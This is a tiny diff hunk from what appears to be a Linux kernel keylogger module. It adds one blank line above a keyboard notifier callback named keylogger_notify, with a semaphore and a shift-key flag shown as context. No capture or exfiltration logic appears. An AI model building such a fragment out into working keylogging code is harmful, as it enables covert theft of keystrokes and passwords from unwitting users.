@@ -9,6 +9,7 @@ struct semaphore sem ;
 
 static int shiftKeyPressed = 0 ;
 
+
 int keylogger_notify(struct notifier_block *nblock ,unsigned long code ,void *_param  )
 {
     struct keyboard_notifier_param *param = _param ;
